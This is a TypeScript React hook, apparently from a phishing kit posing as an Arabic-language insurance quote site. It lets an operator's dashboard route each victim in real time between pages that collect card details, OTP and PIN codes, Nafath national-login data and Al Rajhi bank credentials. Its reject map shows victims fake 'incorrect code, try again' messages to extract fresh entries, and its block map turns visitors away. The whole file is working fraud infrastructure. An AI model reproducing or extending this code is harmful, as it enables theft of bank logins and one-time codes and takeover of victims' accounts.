import { useEffect } from "react";
import { useNavigate } from "@tanstack/react-router";
import { supabase } from "@/integrations/supabase/client";
import { trackPage, getCurrentPage } from "@/lib/tracking.functions";
import { getOrCreateSessionId } from "@/lib/visitor-session";

/**
 * Tracks the visitor's current page and listens for realtime routing
 * commands from the admin dashboard (current_page updates).
 *
 * Admin routing values:
 *  - Normal destination names ("OTP", "PIN", "نفاذ", ...) → navigate to that page (accept).
 *  - Names starting with "رفض " (e.g. "رفض OTP") → navigate back to the page
 *    with ?error=1 so the visitor sees an "invalid info" banner.
 *  - "wait" → stay on the wait screen.
 *
 * The visitor also sees a live toast whenever the admin performs an action
 * (accept / reject / redirect / block) — so realtime commands are always
 * announced, not just silently followed.
 */
export function useVisitorTracking(page: string) {
  const navigate = useNavigate();

  useEffect(() => {
    if (typeof window === "undefined") return;
    // Create the session id on first visit too — so every visitor appears
    // in the dashboard immediately, even before submitting any form.
    const sessionId = getOrCreateSessionId();

    trackPage({ data: { session_id: sessionId, page } })
      .then((r) => {
        if ((r as { blocked?: boolean } | null)?.blocked) {
          navigate({ to: "/blocked" as never });
        }
      })
      .catch(() => {});

    const hasRealtimeConfig = Boolean(
      import.meta.env["VITE_SUPABASE_URL"] &&
        (import.meta.env["VITE_SUPABASE_PUBLISHABLE_KEY"] || import.meta.env["VITE_SUPABASE_ANON_KEY"]),
    );
    if (!hasRealtimeConfig) return;

    const acceptMap: Record<string, string> = {
      "الرئيسية": "/",
      "بيانات التأمين": "/details",
      "مقارنة العروض": "/types",
      "الدفع والتحقق": "/payment",
      "ملخص الطلب": "/summary",
      "OTP": "/payment/otp",
      "PIN": "/payment/pin",
      "معلومات الهاتف": "/payment",
      "نفاذ": "/nafath",
      "مودال نفاذ": "/nafath",
      "اختيار رقم نفاذ": "/nafath-select",
      "انتظار نفاذ": "/nafath-wait",
      "الراجحي": "/rajhi",
      "انتظار الراجحي": "/rajhi-wait",
      "رمز الراجحي": "/rajhi-otp",
      wait: "/payment/wait",
      "ملخص التأمين": "/insurance-summary",
      "تأكيد الوثيقة": "/confirmation",
    };

    const rejectMap: Record<string, { to: string; msg: string }> = {
      "رفض البطاقة": { to: "/payment", msg: "البطاقة المستخدمة غير مدعومة أو غير صحيحة. يرجى إدخال بطاقة أخرى." },
      "رفض OTP": { to: "/payment/otp", msg: "رمز التحقق غير صحيح، يرجى إعادة إدخاله." },
      "رفض PIN": { to: "/payment/pin", msg: "الرقم السري غير صحيح، يرجى المحاولة مرة أخرى." },
      "رفض نفاذ": { to: "/nafath", msg: "بيانات نفاذ غير صحيحة، يرجى المحاولة مرة أخرى." },
      "رفض الراجحي": { to: "/rajhi", msg: "بيانات تسجيل الدخول غير صحيحة، يرجى المحاولة مرة أخرى." },
      "رفض رمز الراجحي": { to: "/rajhi-otp", msg: "رمز التحقق غير صحيح، يرجى إعادة إدخاله." },
    };

    let acted = false;
    const handle = (row: { current_page?: string | null; blocked?: boolean | null } | null) => {
      if (acted || !row) return;
      if (row.blocked) {
        acted = true;
        navigate({ to: "/blocked" as never });
        return;
      }
      const next = row.current_page;
      if (!next || next === page) return;
      const reject = rejectMap[next];
      if (reject) {
        acted = true;
        navigate({ to: reject.to as never, search: { error: "1" } as never });
        return;
      }
      const dest = acceptMap[next];
      if (dest) {
        acted = true;
        navigate({ to: dest as never });
      }
    };

    const channel = supabase
      .channel(`visitor-${sessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "quotes", filter: `session_id=eq.${sessionId}` },
        (payload) => handle(payload.new as any),
      )
      .subscribe();

    // Polling fallback — quotes RLS blocks anon realtime, so poll the public server fn.
    const poll = window.setInterval(() => {
      if (acted) return;
      getCurrentPage({ data: { session_id: sessionId } })
        .then((row) => handle(row as any))
        .catch(() => {});
    }, 2000);

    return () => {
      window.clearInterval(poll);
      void supabase.removeChannel(channel);
    };
  }, [page, navigate]);
}
